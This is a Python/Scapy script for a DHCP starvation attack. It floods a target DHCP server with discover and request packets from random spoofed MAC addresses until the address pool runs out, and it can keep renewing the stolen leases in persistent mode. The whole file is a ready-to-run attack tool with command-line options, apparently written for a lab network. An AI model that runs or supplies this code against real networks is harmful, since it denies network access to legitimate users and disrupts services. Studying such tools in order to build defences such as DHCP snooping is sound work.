from scapy.all import *
import scapy.layers.l2
import sys
import os
import argparse
import random

# python DHCPStarvationNEW.py -i eth0 -t 192.168.56.2
# dhcp-lease-list --lease PATH_TO_LEASE_FILE
# service isc-dhcp-server status
# cat /var/lib/dhcp/dhcpd.leases

count = 1
Persistent = False


def dhcpRequest(responsPacketas, i_face, fakeMac, extension):
    global count, Persistent
    if not Persistent:
        try1 = fakeMac
    else :
        try1 = Ether().src
    if extension:
        srcip = responsPacketas[0][BOOTP].yiaddr
    else:
        srcip = "0.0.0.0"
    req = Ether(src=try1, dst=responsPacketas[0][Ether].src) / IP(dst=responsPacketas[0][IP].src, src=srcip) / UDP(
        sport=68, dport=67) / \
          BOOTP(op=1, chaddr=fakeMac, xid=responsPacketas[0][BOOTP].xid) / DHCP(options=[("message-type", "request"),
                                                                                         ("server_id",
                                                                                          responsPacketas[0][IP].src),
                                                                                         ("requested_addr",
                                                                                          responsPacketas[0][
                                                                                              BOOTP].yiaddr),
                                                                                         "end"])
    sendp(req, iface=i_face, verbose=0)

    if not extension:
        print("Got " + str(count) + " packets!!!")
        count += 1
    if Persistent:
        ackPacketas = sniff(count=1,
                            lfilter=lambda x: (BOOTP in x) and (x[0][BOOTP].xid == responsPacketas[0][BOOTP].xid) and
                                              (x[0][BOOTP].op == 2), iface=i_face, timeout=5)
        return ackPacketas


def persistentmodeON(responsPacketas, i_face, fakeMac):
    ackPacketas = dhcpRequest(responsPacketas, i_face, fakeMac, False)
    while True:
        #ackPacketas = sniff(count=1,
                     #       lfilter=lambda x: (BOOTP in x) and (x[0][BOOTP].xid == responsPacketas[0][BOOTP].xid) and
                      #                        (x[0][BOOTP].op == 2), iface=i_face, timeout=5)
        print("Extension of IP Contract")
        if len(ackPacketas) > 0:
            print("finally")
            time.sleep(2)  # ackPacketas[0][DHCP].options[2][1])
            ackPacketas = dhcpRequest(responsPacketas, i_face, fakeMac, True)
        else:
            print("\nWhy\n")


def rand_mac():
    return "%02x:%02x:%02x:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )


def starveAttack(target_ip="255.255.255.255", i_face=conf.iface, persistent=False):
    global Persistent
    Persistent = persistent
    while True:
        fakeMac = rand_mac()
        server_mac = mac2str(sr1(ARP(op=1, pdst=str(target_ip)), verbose=0)[0][ARP].hwsrc)
        print(fakeMac)
        transectionID = random.randint(1, 500000)
        packeta = Ether(src=fakeMac, dst=server_mac, type=0x0800) / IP(dst=target_ip, src="0.0.0.0") / UDP(sport=68,
                                                                                                           dport=67) / BOOTP(
            op=1, chaddr=fakeMac, xid=transectionID, flags=0xFFFFFF) / DHCP(
            options=[('message-type', 'discover'), ('end')])
        sendp(packeta, iface=i_face, verbose=0)

        responsPacketas = sniff(count=1,
                                lfilter=lambda x: BOOTP in x and x[0][BOOTP].xid == transectionID and
                                                  x[0][BOOTP].op == 2, iface=i_face, timeout=5)

        if len(responsPacketas) > 0:
            if persistent:
                persistentmode = threading.Thread(target=persistentmodeON, args=(responsPacketas, i_face, fakeMac))
                persistentmode.start()
            else:
                dhcpRequest(responsPacketas, i_face, fakeMac, False)
        else:
            print("All the IP on the dhcp server been take!!!")

        # python DHCP_starvation.py -i eth0


def main():
    parser = argparse.ArgumentParser(description='DHCP Starvation')
    parser.add_argument('-p', '--persistent', default=False, action='store_true', help='persistent?')
    parser.add_argument('-i', '--iface', metavar="IFACE", default=conf.iface, type=str,
                        help='Interface you wish to use')
    parser.add_argument('-t', '--target', metavar="TARGET", default=0, type=str, help='IP of target server')

    args = parser.parse_args()

    starveAttack(target_ip=str(args.target), i_face=args.iface, persistent=args.persistent)


if __name__ == '__main__':
    conf.checkIPaddr = False
    main()
